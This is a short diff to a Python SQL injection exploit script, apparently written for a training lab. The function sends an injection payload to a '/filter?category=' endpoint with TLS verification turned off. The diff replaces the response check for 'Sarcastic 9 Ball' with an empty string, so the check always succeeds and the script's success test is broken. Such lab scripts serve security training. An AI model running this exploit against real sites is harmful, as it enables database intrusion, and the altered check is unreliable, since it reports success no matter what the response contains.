@@ -10,7 +10,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def exploit_sqli(url, payload):
     uri = '/filter?category='
     r = requests.get(url + uri + payload, verify=False)
-    if "Sarcastic 9 Ball" in r.text:
+    if "" in r.text:
         return True
     else:
         return False
